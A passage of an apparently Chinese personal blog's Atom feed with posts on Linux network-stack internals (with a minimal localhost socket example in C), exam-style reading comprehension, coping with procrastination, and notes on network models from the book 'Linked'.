<p><img src="/img/remote-control-wild.jpg" alt=""></p>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[从socket应用到网卡驱动：Linux网络子系统分析概述]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/03/08/tcp-ip-internal/"/>
    <id>https://freemandealer.github.io/gallery/2016/03/08/tcp-ip-internal/</id>
    <published>2016-03-08T01:45:15.000Z</published>
    <updated>2016-03-08T07:33:52.000Z</updated>
    <content type="html"><![CDATA[<p>socket是互联网的基础，我们所熟知的互联网应用大部分是基于socket及其变种，如：浏览器、即时通信软件等。socket这个术语最早出现在TCP规范RFC793中。后来它也作为伯克利编程接口。它的定义为如下二元组：</p>
<center><em>socket:=(IP:port)</em></center>

<p>由此，TCP连接可以定义为：</p>
<center><em>TCP Connection := {socket1, socket2}</em></center>

<p>本文将从socket应用出发，分层深入Linux网络模块内部，去分析内部运行原理。</p>
<a id="more"></a>
<h2 id="一个简单的socket应用">一个简单的socket应用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;	<span class="keyword">int</span> sockfd, session_sockfd;	<span class="keyword">struct</span> sockaddr_in addr, client_addr;	<span class="keyword">socklen_t</span> socklen;	<span class="keyword">int</span> recv_size;	<span class="keyword">char</span> buf[<span class="number">200</span>];	sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);	<span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));	addr.sin_family = AF_INET;	addr.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);	addr.sin_port = htons(<span class="number">8000</span>);	bind(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;addr,</span><br><span class="line">			<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));	<span class="built_in">printf</span>(<span class="string">"Listening . . .\n"</span>);	listen(sockfd, <span class="number">1</span>);	<span class="built_in">printf</span>(<span class="string">"Connected\n"</span>);	socklen = <span class="keyword">sizeof</span>(client_addr);	session_sockfd = accept(sockfd, 	(<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;socklen);	recv_size = recv(session_sockfd, buf, <span class="number">200</span>, <span class="number">0</span>);	<span class="built_in">printf</span>(<span class="string">"Received %d bytes: %s\n"</span>, recv_size,  buf);	close(session_sockfd);	close(sockfd);	<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Client</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;	<span class="keyword">int</span> sockfd;	<span class="keyword">struct</span> sockaddr_in addr;	sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);	<span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));	addr.sin_family = AF_INET;	addr.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);	addr.sin_port = htons(<span class="number">8000</span>);	connect(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;addr,</span><br><span class="line">				<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr));	send(sockfd, <span class="string">"Hello, Server!"</span>, <span class="number">15</span>, <span class="number">0</span>);	close(sockfd);		<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个最简单的可以编译运行的socket应用，简单到省略了出错处理。程序的逻辑为：客户端连接服务器，并发送一个字符串，服务器接收这个字符串并显示。</p>
<p>编程中的要点就是一些库函数的调用。我们把这些函数按顺序排列成下图所示形式。这张图正反映了socket的工作流程。</p>
<p><img src="/img/socket-workflow.png" alt="Socket Workflow"></p>
<p>为了完成一次会话，服务器需要预先进入等待连接的状态，即图中的listen调用。为此，服务器首先调用socket创建一个socket文件。至于为什么需要这个文件，是由unix/linux“一切皆是文件”的设计原则决定的。unix/linux中把对网络的操作(配置网络、发送数据包、接收数据包等)都抽象成对socket文件的操作。换句话说，在TCP中，一个socket文件就代表一个socket，一个socket就代表一个网络连接。UDP没有连接的概念，但任然需要一个socket文件作为网络操作的实体。</p>
<p>接着服务器调用bind，为socket绑定本机IP地址和一个没被占用的端口号。计算机网络课程告诉我们，端口号的目的是为了实现复用。通俗一些说，端口号就是为了区分不同进程设置的标识。这些进程都使用网络层收发数据包（复用），端口号就是用来确定正在发送/收到的数据包属于哪个进程。随后，服务器调用listen等待客户端的连接。</p>
<p>下面看图左客户端这边的流程。相比于服务器端，客户端的操作特别简单。依然先调用socket创建一个socket文件作为连接的实体，随后发出connect请求连接。这个请求包含着明确的服务器IP地址和端口号。</p>
<p>服务器收到connect请求后调用accept接受请求。接受请求操作会返回一个新的socket文件。这个文件才是真正与客户端通信的连接所对应的socket文件。accept函数同时会获得客户端的IP地址和端口信息。</p>
<p>至此，双方已经建立连接。此时客户端调用send向服务器发送数据。服务器调用recv接受数据。需要说明的是这个通信是双向的。服务器也可以调用send主动向客户端发送数据。</p>
<p>通信完成后，双方关闭socket文件，释放资源。如果服务器仅仅关闭accept返回的文件，保留最开始的socket文件，那么服务器还有能力接受下一个来自客户端的connect请求（需要一个额外的循环配合listen的调用或者使用多线程）。</p>
<h2 id="内部的故事">内部的故事</h2><p>如果对于应用程序的编写，上述的知识已经足够了。但是如果想要深入了解Linux内核网络协议栈的实现，我们需要站在较低的层次，仔细观察上述流程发生时内核中的处理和变化。</p>
<p>下图展示了整个网络子系统的层次。为了讨论方便，我们按发送数据包的方向，逐层向下描述各个层次的功能特征。接收数据包的方向是相反的。</p>
<p><img src="/img/network-structure.png" alt="Network Structure"></p>
<p>如图所示，系统调用是操作系统内核空间与用户空间的界面。strace工具的结果表明，回溯上述的各个glibc库函数的调用，最终都是系统调用——socket对应sys_socket系统调用，bind对应sys_bind系统调用，send对应sys_sendto系统调用等。</p>
<p>这些系统调用是我们进入内核的入口。进入内核后，VFS(虚拟文件系统)将会进行一些处理。上文说明过，一个socket对应一个socket文件作为操作的实体。本文讨论的这些网络相关的系统调用，都把socket文件作为重要参数，如sys_socket系统就是用来新建并初始化这个socket文件的。sys_bind系统将地址、端口等信息绑定在这个文件上。</p>
<p>离开VFS层，我们下到INET层。这一层的核心数据结构，就是struct socket。每一个socket文件都有一个socket控制实体(数据结构struct socket的实例)与之对应。这个socket控制实体自身以及其成员包含了socket的所有信息，包括状态、标志、操作、数据缓冲区信息等。</p>
<p>有必要说明的是INET这一名称的来历：回顾之前socket应用的例子，可以看到我们调用socket()时曾经传递过一个参数AF_INET。计算机网络课程中我们学习过“细腰结构”——IP over Everything &amp; Everything over IP。但实际上第三层还是有很多不同于IP协议的存在，如IPv6、IPX、DNNET等。Linux称它们为不同的地址簇(Address Families, AF)，或叫协议簇(Protocal Families, PF)。INET就是一个地址簇。从另一个角度看，内核代码的net目录下有很多子目录都是一个个独立的地址簇，其中包含一个命名为af_XXX.c的文件用于初始化该地址簇以及提供一些重要的操作。例如在net/ipv4目录中，我们可以看到af_inet.c文件。原来INET就是使用IP(第四版)协议的地址簇!更佳准确的说法是INET封装了TCP/IP。我们在这里只关注TCP/IP协议，只研究INET。</p>
<p>IP和INET有着紧密的联系，但IP层和INET层并不是等价的概念。INET仅仅是使用了IPv4的协议的地址簇，在TCP/IP参考模型中，它不是单独的一层。INET是Linux网络子系统的一个抽象层次，向上提供了操作的接口，但实际还需要调用下层的功能才能完成数据发收、监听等任务。具体调用下层的什么功能，要根据通信类别来选择。TCP/IP协议栈中，通讯有三种类别：TCP、UDP和RAW方式。前两种方式在计算机网络课程中有较多的讨论，大家比较熟悉。最后一种RAW，从某种意义上说，并不是额外的应用层通信方式——它只是告诉应用层不用理会，直接把数据传递到下一层即可，由网络层直接处理。ICMP是基于RAW方式的一个重要协议，只不过它有一些特殊的性质，所以单独列在这里。</p>
<p>如果是发送数据包，数据通过TCP、UDP操作的处理，或是直接通过RAW方式，最终将来到IP层。这一层中出现了重要的数据结构sk_buff(socket buffer的缩写)，存储着数据和连接信息，后面操作的中心从之前的socket、sock数据结构转移到sk_buff上来，sock被释放。IP层对数据进行处理后需要对其进行发送。考虑到IP层的一项重要任务是路由，这里的发送不是直接将数据包传递给下面的层次，而是需要在路由系统中进行游历。在Linux中，路由表被称作转发表(Forward Information Base, FIB)。为了提升查找性能，转发表有一个cache叫做rtable(字面意为“路由表”)。为了避免混淆，我们称rtable为转发表的cache。查找路由表的方式同一般的cache机制：首先查找转发表cache，若命中即使用该路由，否则查找转发表，并将路由信息添加进转发表cache。转发表cache是用带桶的hash表实现的，其key是流标识flowi(Flow Identifier)，用来唯一确定一条业务流。如果找到合适的路由后，我们就便把发送的数据传递给下层。但也可能发生找不到路由的情况，例如第一次向一台远程主机发送数据。这时，内核将会暂停发送数据的工作，转而完成邻居发现/地址解析(ARP)。</p>
<p>完成这一工作的是图中倒数第二层的ARP和邻居子系统。它们之间类似于包含关系。ARP的功能是将IP地址映射成MAC地址。邻居子系统的功能是将IP地址映射成链路层硬件地址。MAC地址是硬件地址的一种。对于非以太网设备，其硬件地址不一定是MAC地址。所以ARP可以看成是邻居子系统的一个特殊情况。当然地址解析不是每次都能成功的，特别是第一次向某个主机发送数据时。这时邻居系统将会暂停数据发送流程，转而进行邻居发现的流程。这一层次的功能实质是衔接IP层和链路层，开始使用硬件地址，并有了设备的概念。</p>
<p>真正与设备紧密联系的是图中的最后一层：设备驱动层。它位于参考模型中的链路层。正是它控制硬件，将数据包发送出去。虽然内核编程使用的C语言是面相过程的程序设计语言，但Linux的驱动模型具有鲜明的面相对象特征。驱动这一“抽象类”定义了很多虚”方法”，由具体的驱动程序去实现这些”方法“。这些”方法“对应着网卡硬件功能的抽象，由操作系统内核回调，以完成数据收发、网卡配置等任务。</p>
<p>上述讨论部分按照发送数据的流程进行，接收数据与之有很大差别，但任然可以参考反方向进行分析。</p>
<h2 id="附：结合网络模拟器学习计算机网络">附：结合网络模拟器学习计算机网络</h2><p>本学期刚好选修了一门TCP/IP协议分析与编程的课程，所以想到把篇文章po上博客。文章起草于2016春节，当时的动机是：刚刚修完计算机网络这门课，学到很多很多的概念和协议，但总觉得很虚、不实在。当时认为，学习一个具体系统的网络实现会让这些模糊的概念生动起来，所以选择对开源的Linux内核代码的网络模块进行了调研。</p>
<p>而现在，我找到了更好的一条学习路径。在开学前几天，我回了一趟实验室。就在实验室的这两天，我接触到了一个叫做OMNET++的网络模拟软件。利用OMNET++可以开发自己的网络模拟器，但就学习、验证计算机网络课程学习的知识而言，我们直接运行OMNET++自带的一些实例就可以得到极大的满足。OMNET++编写的模拟器可以用动画的形式展示网络的行为。同时，我们也可以任意停止时间，观察网络中的数据包和各个层次、各个组件的状态。最近我就单步运行了一个DHCP的实例，对照书本中说明的流程，学习了DHCP。只要愿意，我们甚至可以修改代码，改造某一协议，并通过模拟验证修改对整个网络的影响。</p>
<p>从本科学习计算机网络这门课以来到现在，我总结了一个自我认为很爽快的学习路径：</p>
<p>从计算机网络课程学习基本概念 －&gt; 借助模拟器观察实际网络行为 -&gt; 分析开源系统的代码获得具体技术细节实现</p>
<p>之前直接跳过第二环节去分析源代码，现在看来傻乎乎的。缺少一个直觉、系统的认识，那么学习曲线会十分陡峭，常常摸不着头脑。</p>
<h2 id="参考资料">参考资料</h2><ul>
<li>Linux内核源代码 www.kernel.org</li>
<li>CSDN专栏Linux内核网络栈源代码分析 <a href="http://blog.csdn.net/column/details/linux-kernel-net.html" target="_blank" rel="external">http://blog.csdn.net/column/details/linux-kernel-net.html</a></li>
<li>PDF Linux-Net 和它的读书笔记  <a href="http://www.cnblogs.com/better-zyy/archive/2012/03/16/2400811.html" target="_blank" rel="external">http://www.cnblogs.com/better-zyy/archive/2012/03/16/2400811.html</a></li>
<li>PDF Linux TCP/IP协议栈分析(二到五章)</li>
<li>Linux Manual Page</li>
<li><a href="http://blog.csdn.net/wearenoth/article/category/1131669" target="_blank" rel="external">http://blog.csdn.net/wearenoth/article/category/1131669</a></li>
<li><a href="http://blog.csdn.net/minghe_uestc/article/details/7819925" target="_blank" rel="external">http://blog.csdn.net/minghe_uestc/article/details/7819925</a></li>
<li><a href="http://www.omnetpp.org" target="_blank" rel="external">http://www.omnetpp.org</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>socket是互联网的基础，我们所熟知的互联网应用大部分是基于socket及其变种，如：浏览器、即时通信软件等。socket这个术语最早出现在TCP规范RFC793中。后来它也作为伯克利编程接口。它的定义为如下二元组：</p>
<center><em>socket:=(IP:port)</em></center>

<p>由此，TCP连接可以定义为：</p>
<center><em>TCP Connection := {socket1, socket2}</em></center>

<p>本文将从socket应用出发，分层深入Linux网络模块内部，去分析内部运行原理。</p>]]>
    
    </summary>
    
      <category term="Notes" scheme="https://freemandealer.github.io/gallery/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[阅读理解：理解不理解当是自己说的算]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/02/19/reading-comprehension/"/>
    <id>https://freemandealer.github.io/gallery/2016/02/19/reading-comprehension/</id>
    <published>2016-02-19T14:18:10.000Z</published>
    <updated>2016-02-19T14:28:15.000Z</updated>
    <content type="html"><![CDATA[<p>事情是这样的，最近有很多书要读，所以想在寒假里训练一下阅读速度。我认为买一本专门的训练材料还是必要的，那种可以算出我的每分钟阅读字数和理解程度的材料——没错，最后我使用了一本英语考试阅读理解、快速阅读那种形式的书。看到这里有人可能已经觉得我脑残了，可是当时我并不自知。</p>
<a id="more"></a>
<p>拿到书我迫不及待地做了一个测试：打开计时器，尽最大努力快速地读完一篇文章，感觉理解得差不多了，关掉计时器，做题目。一看题目傻眼了：都是一些人名、时间、地点、数量这些我根本不care的东西。结果当然是差劲得要命。</p>
<p>完了开始读第二篇、第三篇测试，我长心眼地留神关注这些外国人名、时间，果然分数高了很多。心想着一上午我的理解力就训练地突飞猛进，顿时心里<del>像喝了蜜一样甜</del>很慌张，赶紧进入反思状态。</p>
<p>真的是理解力提升了吗？依我看，更正确的提法是“应试能力得到提升”。我的理解还是之前的状态，只是多花了时间记住可能要被问到的一些要素。是的，考试这么多年，预测题意和考点当然炉火纯青。</p>
<p>阅读时需要仔细理解的，无非是我们感兴趣的内容。什么是感兴趣呢？“感兴趣”的英文是interest，原意是“吸引注意”，包含着比中文“兴趣爱好”或“有意思”更广泛同时更具体的含义。在阅读时能吸引我们注意的内容，不仅仅是“有趣的”，不仅仅是兴趣爱好，还可能是满足我们好奇心的，能带给我们利益的，解决我们当前问题的。</p>
<p>相比以上这些，潜在的考点更能吸引我们学生的注意力。每当阅读，看到who/what/why/when/where/how/how many/much我们就暗自窃喜，感觉悟到了考点，赶紧多看几眼。理解了潜在考点相关的内容，我们真的理解“感兴趣的内容”了吗？是的，我们理解了，但那是出题老师感兴趣的，或者出题老师以为我们感兴趣的。我们想了解一个精妙的实验过程，我们真的需要知道那位科学家长长的名字吗？甚至有时，为了节约珍贵的考试时间，我们往往忍痛忽略了自己真正好奇的内容。</p>
<p>英语听力也是这样。我知道美国采取了新政策，但我并不关心是国防部发布的还是卫生署发布的。我知道日本地震死了很多人，但我不在意具体300还是400。甚至有些消息全部我都不关心。但为了出成一张试卷，较为公平地筛选人才，只能问一些普遍的问题。这些问题我感兴趣自然会理解得很清楚，不感兴趣的很遗憾，为了分数，只能假装自己感兴趣。最后，也不知道自己对什么感兴趣了。</p>
<p>这是应试的悲哀，而我却在逃离应试进入自由学习环境后，放弃追求真正感兴趣的内容，重新回到了囚笼。其实我不用费尽心思找专门的训练材料，看任何想看的书本身就是训练。其实我当完成第一篇测试时，分数虽然低，但是我相信自己理解了自己感兴趣的内容。理解不理解，这是不能由分数评判的，而是只有自己清楚。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>事情是这样的，最近有很多书要读，所以想在寒假里训练一下阅读速度。我认为买一本专门的训练材料还是必要的，那种可以算出我的每分钟阅读字数和理解程度的材料——没错，最后我使用了一本英语考试阅读理解、快速阅读那种形式的书。看到这里有人可能已经觉得我脑残了，可是当时我并不自知。</p>]]>
    
    </summary>
    
      <category term="Meta" scheme="https://freemandealer.github.io/gallery/tags/Meta/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[拖延症]]></title>
    <link href="https://freemandealer.github.io/gallery/2016/02/04/procrastination/"/>
    <id>https://freemandealer.github.io/gallery/2016/02/04/procrastination/</id>
    <published>2016-02-04T09:30:31.000Z</published>
    <updated>2016-02-19T14:22:46.000Z</updated>
    <content type="html"><![CDATA[<p><center><br><img src="http://www.hyyxw.net/upload/image/20151110134245t1jo.jpg" alt=""><br></center><br><a id="more"></a></p>
<p>我知道会点开看这篇文章的都是什么人，所以开头就不用“您是否曾感到XXX”的排比句式激起共鸣、揭你们伤疤啦。本文整理我在战拖生涯里的所听所闻所想。</p>
<p>首先有必要简单定义一下拖延症。说到它，很多人的直观感受就是做事慢，因而怀疑自己或他人是拖延症患者。做事慢的原因其实有很多，常见的有完美主义者：考个试检查几十遍不敢交，下盘棋思来想去不落子，写个稿子一直改到deadline，画幅画一笔一刷直到死…… 想想就可怕，还好我们在这里不讨论他们。我们讨论的拖延症是：<strong>把应该马上去做的事拖着不做，而改做一些无关紧要的事，同时产生巨大的心理压力进一步阻止自己去做事的情况。</strong></p>
<p>我应该马上分享我的战拖策略，但我还是想做一些无关紧要的事。看别人写文章How之前总要Why一下，所以我们来强行说一说为什么会有拖延症呢？开脑洞一分钟…… 尤里卡！之前听加州大学的公开课《Learning How to Learn》时教授提到，做不情愿做的事，大脑负责“疼痛”的区域会兴奋。原来拖延症就跟打针一样，明知道那一针可以治病却还是忍不住躲着它。进化给予生物一大特征就是：趋利避害。如果哪个生物总是在给自己制造疼痛（简称作死），那也不会繁衍至今对不对？所以我们逃避疼痛，逃避不情愿做的事，拖延症状就产生了。总结一句话，我拖延我有理，这是进化决定的！</p>
<p>不知道你有没有觉得：好像拖延症在我们这一代人身上特别明显？父辈祖辈在我们心中可都是劳模形象！解释这点，我们需要反思我们跟先辈有什么差别：除了我们被更多诱惑包围外，有个重要区别是我们的工作种类不同。这不是废话：我们的祖先很多都是面朝黄土背朝天的农民，甚至追溯到农耕文明之前，都是原始人。他们的工作是和生存紧密联系的。他们不及时耕作、不努力狩猎，就会饿死。回头看现代人的工作——真的太抽象了！我真的没法从面前的文稿和电脑屏幕里嗅出食物的芬芳。我们“体面”的工作远离了生存刚需。拖一天写完文档并不会影响我们的生存。这时大脑里趋利避害的原始本能说：你还有什么理由不拖呢？</p>
<p>终于到了分享战拖策略的环节。其实我想说，战拖的方法就藏在它的定义里——你不需要做什么，你只要知道什么是拖延症，就完成一半了。我们复习一下定义,着重注意最后半句话：把应该马上去做的事拖着不做，而改做一些无关紧要的事，<strong>同时产生巨大的心理压力进一步阻止自己去做事</strong>。我们想办法不产生心理压力不就成了吗？方法是：投降！我们是无法战胜拖延滴，但是我们可以调节心态：拖延症不是病！它是本能！我拖我有理！天底下几十亿人陪着我们拖拖拖！不用自卑！不过如果你非要说拖延症是病的话，医学上似乎也是承认的，但这个“拖延症”是指那种心理压力大到奔溃出现幻觉自杀那种可怕晚期，你不至于吧？</p>
<p>除了向拖延症屈服以外，还有一些方法能让我们感觉更舒服：想想啊，既然成因是由于我们做不情愿做的事，那我们就做自己情愿做的事呗，做自己喜欢的事！虽然带有强烈的理想主义色彩，但是这是我能想到的最好的方法了。我自己就很幸运，选对了大学专业，一直可以做自己喜欢做的事。有一天我甚至发现困扰我整个中学备考时期的拖延症完美自愈了！正当我忙着和别人分享胜利成果时，突然发现做一些乏味的事务时，又开始进入老状态。这证明了兴趣的力量吧，千万不能小觑兴趣，跟随你的心往往能让你事半功倍。</p>
<p>推演兴趣疗法，我们还能得到另外的启示。我们对每一件事的喜欢程度（或讨厌程度）不同。相比于考试，我更喜欢上课，相比于上课，我更喜欢敲代码，相比于敲代码，我更喜欢睡觉，相比于睡觉，我更喜欢看电影。这样就形成了一条喜欢链条：</p>
<pre><code>考试 &lt; 上课 &lt; 敲代码 &lt; 睡觉 &lt; 看电影
</code></pre><p>我们面对着链条某一环节时，更愿意做这个环节后面的事(不一定是最后)。要上课了，让我看电影是相当不错，但让我睡觉，我也会很开心，让我不去上课敲代码的话我也愿意。这就是为什么到了考试复习月，很多同学觉得自己对除考试外的很多其它事物充满了兴趣，但到了放假（到了链条尾端），又开始嫌弃那些爱好。有意思的是，看着这个链条，斯坦福某位教授竟突发奇想，发明了“结构化战拖”法，思想就是多件事相互拖延，构成了一条合理的拖延链，帮助自己完成其中的某些事务，并因此荣获了“搞笑诺贝尔奖”。听起来确实有那么点不靠谱，但还是很有启发意义的不是吗？</p>
<p>下面分享一个比较正经的、让我受益颇多的方法：下一步行动。这个方法来自于哪里我已经记不得了，感觉我是把很多人提的建议归纳起来得到了这个方法(这个名字似乎来自于GTD?)。下一步行动的大致思想就是把一项复杂任务拆解成明确的任务，对于每个明确任务我们再确定一个容易上手的下一步行动。比如对于我们经常提及的“锻炼身体”这个复杂工程，我们可以分解成“跑步”、“肌肉训练”和“心肺功能训练”三项较为具体的任务。对于“跑步“我们的下一步行动就可以是”穿上跑鞋“。大家可以看到这是一个抽象活动具体化的过程，因为活动越具体、越短、越接近自己的身体的基本技能，我们就越不容易”痛苦“，就越不容易拖延。如果说”跑十公里“会勾起你痛苦的回忆导致你在门口犹豫，那么”穿上跑鞋“就是一个容易完成的下一步行动。穿上跑鞋后面我们该干什么呢？后面是不是还要有“开门”、“下楼”、“压腿”等等一系列操作？答案是：一般不用考虑。我们通常只关注第一个下一步行动，因为后面的事都是自然而然发生的。就像穿衣服，我们只需要把一只胳膊插进袖管，后面的活动便会行云流水般完成了。</p>
<p>当然有些事并不会因为我们做了一个下一步行动之后就会“自然而然发生”。这是因为我们划分不够细腻：我们把刷牙当作一件事去做，第一步行动是挤牙膏，然后就会自然而然地刷牙；如果我们把整个早起准备的过程当做一件事去做，希望自己下床之后，洗漱、做早餐、吃早餐、化妆整理等一系列流程自然而然地发成，那就太困难了。</p>
<p>但办法还是有的。我们不能自然而然是因为没有那个习惯，或者说没有那么大尺度的习惯。但习惯是可以养成的。上个月看指导员的时间管理视频，提到“晨起仪式”，就是一种习惯养成的好方法。核心思想就是固定早起准备的每一个步骤和消耗的时间（所以我猜测这里的“仪式”就是”雷打不动的例程”）。在使用了这个方法后，我体会到一些好处：因为每个步骤都是之前确定的，所以减少了选择和犹豫的时间。每次选择和犹豫其实都在挑战自己的意志力，所以固定步骤可以释放意志力，这点对我这种意志力薄弱的人特别有用——我相信系统，不相信自己，系统是稳定的、科学的，自己是情绪化的、容易松懈的。</p>
<p>当然晨起仪式还有更明显的好处：从起床到出门的时间变短了，而且对这段时间的长短有了概念！我们往往对时间没有概念，总感觉时间还长，可以懒一会儿。如果我知道早起准备需要的时间，我就可以根据出门时间精确地设定我的起床时间。到了这个点，我就知道自己不能再懒床了，不然就一定会迟到——就像祖先们知道自己不及时播种、狩猎就一定会饿死一样，根本没有胆量拖延。</p>
<p>类似“时间还多”、“这事好办”，我们很多乐观的错觉会成为我们做计划时的陷阱，所以对自己的了解很重要。我一般在清晨用崭新的状态尽量科学地做一天的计划，选择几个重要的任务，估计最坏情况下的时间开销，并排列起来。然后在大脑中将今天的流程过一遍。过完了有时就会感叹：原来一天这么短。有时会觉得今天的任务特别多，又没法做减法，只好把这一天过得小心翼翼。我觉得这个在大脑中提前“过”一天的方法，很大程度上减轻了晚上睡觉前突然发现自己一天没做什么事的惊悚感。</p>
<p>最重要的事情最先做。老生常谈之言，往往就是改变的关键。就这一条，能让工作变得更加舒心。有时我们拼命工作了很久，成就感是有，就是觉得不踏实。随着时间流逝，我们开始怀疑：手头的这件事真的重要吗？在真正埋头苦干之前，战略性地提取最重要的事去做，可以让我们工作过程中心态更加健康。我们知道自己每走一步都是在靠近更好的自己，所以充满动力。如果不把最重要的事最先做，我们不仅会怀疑自己的努力，有时甚至让我们一事无成。因为我们最应该做的事往往是具有挑战性的，我们如果不能在自己精力最充沛的时候抢先爬上这座高山，可能以后就再也没有信心想去征服它了。就像之前我看书有个习惯，一本书的核心内容普遍很难理解，我会先把前言、背景看了，直到有个地方卡住了，我就会翻过去，提前把后面一些轻松一点的总结、展望内容看掉，把核心部分留着最后集中精力啃，幻想着能农村包围城市。可事与愿违，大部分的精力耗在非核心的部分，在没有力气去啃核心了。同时，跳过核心去看后面的内容有时就像搭建空中楼阁，一本书翻下来，收获甚微。</p>
<p>另外再记录一点我在《巧学助我上清华》这本书里看到的内容和网上的解读。怎么会看这个？还不是为了我两个正在上中学的侄子:(</p>
<ul>
<li>理论一:今天的作业 明天做比较枯燥;明天的作业 今天做很有动力,也趣味十足.</li>
<li>理论二:延迟奖励</li>
</ul>
<p>解读:理论一是说今天就开始做明天的事情,轻松且正能量方面(自信心)加成,这是好学生不断滚雪球一样滚得自信心越来越强大的学习技巧; 理论二是说,当可以休息时(奖励),你却不松懈继续努力,这是不断超越的王道理论.</p>
<p>关于战拖差不多记录完了。最后我想说拖延有时也是优势。一方面，我们可以借助deadline强大的推动力，将一些不太重要的事临门一脚。另一方面，我们有时真的需要等等看：等着天时地利人和，等着积淀。特别是对于一些不靠谱的事，你一定不想看到自己提前做了一半，突然老板说不做了这种情况发生吧。什么时候该等待，这真的需要智慧，甚至自制。</p>
<p>拖延症不是病，是我们的原始本能被这个时代的工作类型放大了。我们不应该为此懊恼，压抑本性，而应顺水推舟。这就是我对拖延症的理解。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><center><br><img src="http://www.hyyxw.net/upload/image/20151110134245t1jo.jpg" alt=""><br></center><br>]]>
    
    </summary>
    
      <category term="Meta" scheme="https://freemandealer.github.io/gallery/tags/Meta/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[网络模型的演化——《链接》读书笔记]]></title>
    <link href="https://freemandealer.github.io/gallery/2015/10/30/linked/"/>
    <id>https://freemandealer.github.io/gallery/2015/10/30/linked/</id>
    <published>2015-10-30T05:56:38.000Z</published>
    <updated>2015-11-01T04:38:02.000Z</updated>
    <content type="html"><![CDATA[<p>从咱们程序员口中听到“网络”一词，大家会不会立即联想到路由器、交换机这些东西呢？今天我想和大家说的网络，可不局限于计算机网络。事实上，我们周围存在着的网络远比想象中的多：好莱坞影星合作网络，化学反应中物质转化的网络，引用文献网络，经济网络等等。哦，当然还有蜘蛛网——一提到网络就会印入大脑的图像。可网络很复杂，不是一张蜘蛛网就能描述的。如何去描述网络一直是科学家们纠结的问题。现在让我们来看看人们是如何建立模型，一步步逼近真实网络，去描述世界。</p>
<a id="more"></a>
<p>七桥问题，即欧拉图的研究，开创了“图论”这门新的数学分支。欧拉图的贡献在于，它从实际问题中抽象出了模型，使得人们不再去研究路径寻找，而将注意力转移到对图的性质的研究。后来，一些著名的数学家，比如柯西、汉密尔顿等，为图论的发展贡献了很多力量。最后，蓬勃发展的图论渐渐分化出一个分支专门研究一种特殊的图——网络。这就是网络学的起源。</p>
<p>早期大家研究的网络都是确定的甚至是规则的。什么是规则的网络？请大家回忆中学时周一站在操场上开晨会，每个同学都只能与周围前后左右四个同学小声交流。每个同学就是网络的节点。如果两个同学之间能直接交流，他们之间就有一条链接。想象站在东南角的同学把信息传递给西北角的同学，那么信息最短要经过对角线上的几百个同学。</p>
<p>晨会的队形不是自然的队形，它是被政教处的指令所约束的。规则的网络也不是真实的网络，它充满着数学家为简化问题引入的约束。真实网络是复杂的，真实网络中的很多现象是利用规则网络这个简陋的模型没有办法解释的，比如“小世界”的现象。</p>
<p>有一个大学同学，由于某单位欺骗性招生，现在研究生阶段痛苦不堪。长痛不如短痛，她酝酿了一个大胆的计划：想着偷偷逃离原单位，申请去国外深造。但是她很快放弃了。因为她发现，国外大学的教授很可能认识原单位的导师，或者经过很少的几个人的介绍就能相互联系到，很快就能“抓住”她。学术圈相比于科学家分布的地理环境要小得多，这是一种典型的小世界模型。</p>
<p>在六度分离的“小世界”网络里，所有人之间隔着的至多六个人的链接。我想递一个消息给任意指定的地球居民，这个消息最多传递六次。同样还有网页间“十九度分离”，表明每两个网页之间的链接数不会超过十九个。你从白宫主页开始点链接，打开一个网页再点链接，这样重复不到十九次就能点进我的博客主页。网络奇迹般的变小了！？</p>
<p>为了解释“小世界”现象，科学家尝试在网络中引入随机性：用掷骰子的方式决定要不要在任意两个节点之间画上一道链接。再看我们的晨会队列，如果现在链接随机了，那么可能我没法和站在我周围的人有链接，却和隔着十几个人的同学之间进行飞鸽传书—。一个极端的例子是东南角的同学可以直接和西北角的同学之间拥有链接。因为引入了随机，这些都是概率事件，是可能发生的。由于这些可能性，随机的链接把节点之间的平均间隔变小了。</p>
<p>不过，如果世界仅仅是随机的，你和你小区的邻居应该与美国底特律八里街上的居民一样亲密。这明显是不符合我们体验的。同时一定有某种特殊的力量，同样爱好的小伙伴的交往会比不同爱好的同学之间的交往密切高很多。这股力量就是网络的聚团性。俗话说：物以类聚，人以群分。看看我们的晨会队列，现在大家都三五成群地和附近的人抱团聊天。团体间聊得热火朝天，却很少向外界透露消息。</p>
<p>团聚性模型破坏了六度分离的性质。因为大量的链接被用于增加团体内部结合的紧密度，势必会减少团体间的连通程度，这样会不会成为一个“大世界”呢？实验证明，只要团体间的随机链接没有完全消失，随机模型和团聚性模型是可以共存的，成为一个更加贴近真实网络的模型。</p>
